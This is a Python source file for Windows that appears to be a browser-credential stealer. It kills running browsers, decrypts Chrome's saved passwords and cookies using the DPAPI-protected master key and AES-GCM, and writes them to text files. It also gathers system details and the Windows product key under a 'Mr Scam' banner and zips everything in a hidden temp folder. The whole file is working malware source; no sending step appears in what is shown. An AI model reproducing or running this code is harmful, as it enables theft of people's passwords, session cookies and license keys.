import base64
import os
import subprocess
import sys
import json

import random
import shutil
import sqlite3
import re
import traceback
import time
import ctypes
import logging
import zlib

from Crypto.Cipher import AES
from threading import Thread
from ctypes import wintypes
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
disable_warnings_urllib3()


APPDATA:str = os.getenv("APPDATA")
LOCALAPPDATA:str = os.getenv("LOCALAPPDATA")

class ChoriumBrowsers:
    
    encryptionKey: bytes = None
    BrowserPath: str = None
    LoginFilePaths: str = None
    savePath: str = None
    def __init__(self, browserPath: str) -> None:
       
        if("Opera" in browserPath):
            browserPath = os.path.join(APPDATA, browserPath)
        else:
            browserPath = os.path.join(LOCALAPPDATA, browserPath)
        self.BrowserPath = browserPath
        self.encryptionKey = self.GetEncryptionKey()
    def GetEncryptionKey(self) -> bytes:
        if self.encryptionKey is not None:
                return self.EncryptionKey
            
        else:
            localStatePath = os.path.join(self.BrowserPath, "Local State")
            if os.path.isfile(localStatePath):
                with open(localStatePath, encoding= "utf-8", errors= "ignore") as file:
                    jsonContent: dict = json.load(file)

                    encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
                    encryptedKey = base64.b64decode(encryptedKey.encode())[5:]

                    self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
                    return self.EncryptionKey

            else:
                return None    
    
    def GetLoginPaths(self,browserPath: str):
        loginFilePaths = list()
        for root, _, files in os.walk(browserPath):
            for file in files:
                if file.lower() == "login data":
                    filepath = os.path.join(root, file)
                    loginFilePaths.append(filepath)
        return loginFilePaths
    
    def GetPasswords(self, savePath: str):
        for path in self.GetLoginPaths(self.BrowserPath):
            name = ""
            if "Default" in path:
                name = "Default_Password.txt"
            else:
                a: list = path.split("\\")
                name = a[len(a)-2] + "_Password.txt"
           
            while True:
                tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                if not os.path.isfile(tempfile):
                    break
            try:
                shutil.copy(path, tempfile)
            except Exception:
                continue
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b : b.decode(errors= "ignore")
            cursor = db.cursor()
            f = open(savePath+ name, mode="a+", encoding="utf8")
            try:
                results = cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()

                for url, username, password in results:
                    password = self.Decrypt(password, self.encryptionKey)

                    if url and username and password:
                        f.write(f"URL: {str(url)}\nUsername: {str(username)}\nPassword: {str(password)}\n")
                        Counter.PasswordCount +=1

            except Exception as e:
                print(e)
            f.close()
         
    def Decrypt(self, buffer: bytes, key: bytes):
            version = buffer.decode(errors="ignore")
            if(version.startswith(("v10", "v11"))):
                iv = buffer[3:15]
                cipherText = buffer[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt(cipherText)
                decrypted_pass = decrypted_pass[:-16].decode()
                return decrypted_pass
            else:
                return str(Syscalls.CryptUnprotectData(buffer))
    #======================== COOKIES =================================
    def GetCookiesPath(self, browserPath: str):
        
        cookiesFilePaths = list()

        for root, _, files in os.walk(self.BrowserPath):
            for file in files:
                if file.lower() == "cookies":
                    filepath = os.path.join(root, file)
                    cookiesFilePaths.append(filepath)
        return cookiesFilePaths
    def GetCookies(self, savePath: str):
        
        for path in self.GetCookiesPath(self.BrowserPath):
            name = ""
            if "Default" in path:
                name = "Default_Cookies.txt"
            else:
                a = path.split("\\")
                name = a[len(a)-3] + "_Cookies.txt"
            while True:
                tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                if not os.path.isfile(tempfile):
                    break    
            try:
                shutil.copy(path, tempfile)
            except:
                continue
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b : b.decode(errors= "ignore")
            cursor = db.cursor()
            f = open(savePath + name, "a+", encoding="utf8")
            try:
                results = cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall()

                for host, name, path, cookie, expiry in results:
                    cookie = self.Decrypt(cookie, self.encryptionKey)
                    flag1 = "FALSE" if expiry == 0 else "TRUE"
                    flag2 = "FALSE" if str(host).startswith(".") else "TRUE"
                    if host and name and cookie:
                        f.write(f"{host}\t{flag1}\t{path}\t{flag2}\t{expiry}\t{name}\t{cookie}\n")
                        Counter.CookiesCount += 1

            except Exception:
                pass
            f.close()
class Counter:
    CookiesCount: int = 0
    PasswordCount: int = 0
class Utility:
    @staticmethod
    def GetRandomString(length: int = 5, invisible: bool = False): # Generates a random string
        if invisible:
            return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= length))
        else:
            return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= length))
    @staticmethod
    def TaskKill(*tasks: str) -> None: # Tries to kill given processes
        tasks = list(map(lambda x: x.lower(), tasks))
        
        out = (subprocess.run('tasklist /FO LIST', shell= True, capture_output= True).stdout.decode(errors= 'ignore')).strip().split('\r\n\r\n')
        
        for i in out:
            i = i.split("\r\n")[:2]
            try:
                name, pid = i[0].split()[-1], int(i[1].split()[-1])
                name = name [:-4] if name.endswith(".exe") else name
                for task in tasks:

                    if task in name.lower():
                        subprocess.run('taskkill /F /PID %d' % pid, shell= True, capture_output= True)
            except Exception:
                pass
class Syscalls:
    @staticmethod 
    def CreateMutex(mutex: str) -> bool:
        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexA(None, False, mutex)
        return kernel32.GetLastError() != 183
    @staticmethod 
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes:
        class DATA_BLOB(ctypes.Structure):

            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None

        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode("utf-16")
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)

        raise ValueError("Invalid encrypted_data provided!")
class Paths:
    browserPaths = [
        os.path.join("Google", "Chrome","User Data")
    ]   
    
    @staticmethod 
    def kill():
        
        for i in ["chrome", "brave", "opera", "edge"]:
            Utility.TaskKill(i)
        
def Steal(savePath: str):
    
    saveBrowser = savePath +"\\Browsers Data\\"
    
    for path in Paths.browserPaths: 
        saveBrowser = saveBrowser + path + "\\"
        os.makedirs(saveBrowser, exist_ok=True)
        instace = ChoriumBrowsers(browserPath= path)
        instace.GetCookies(saveBrowser )
        instace.GetPasswords(saveBrowser )
    saveSystemInfo = savePath + "\\SystemInfomation.txt"
    computerName = os.getenv("computername") or "Unable to get computer name"
    computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()
    computerOS = computerOS[2].strip() if len(computerOS) >= 2 else "Unable to detect OS"
    totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
    totalMemory = (str(int(int(totalMemory[1])/1000000000)) + " GB") if len(totalMemory) >= 1 else "Unable to detect total memory"
    uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
    uuid = uuid[1].strip() if len(uuid) >= 1 else "Unable to detect UUID"
    cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to detect CPU"
    gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()
    gpu = gpu[2].strip() if len(gpu) >= 2 else "Unable to detect GPU"
    productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to get product key"
    info ="============================================================\n"
    info+="###################### Mr Scam #############################\n"
    info+=f"Name: {str(computerName)}\n"
    info+=f"OS: {str(computerOS)}\n"
    info+=f"CPU: {str(cpu)}\n"
    info+=f"GPU: {str(gpu)}\n"
    info+=f"RAM: {str(totalMemory)}\n"
    info+=f"UUID: {str(uuid)}\n"
    info+=f"Product Key: {str(productKey)}\n"
    info+="============================================================\n"
    with open (saveSystemInfo, "w") as f:
        f.write(info)
        f.close()
    InfoLog.FileName = computerName
class InfoLog:
    FileName: str
    IP: str
    Country: str
    Date: str
if __name__ == "__main__" and os.name == "nt":
    TempPath = ""
    while True:
        TempPath = os.path.join(os.getenv("temp"), Utility.GetRandomString(10))
        if not os.path.isdir(TempPath):
            break
    print(TempPath)
    
    t = Thread(target=Paths.kill)
    t2 = Thread(target=Steal, args={TempPath},)
    tasklist: list[Thread] = []
    tasklist.append(t)
    tasklist.append(t2)
    for th in tasklist:
        th.start()
    for th in tasklist:
        th.join()
    zipf = TempPath
    shutil.make_archive(zipf, "zip", TempPath)
    
    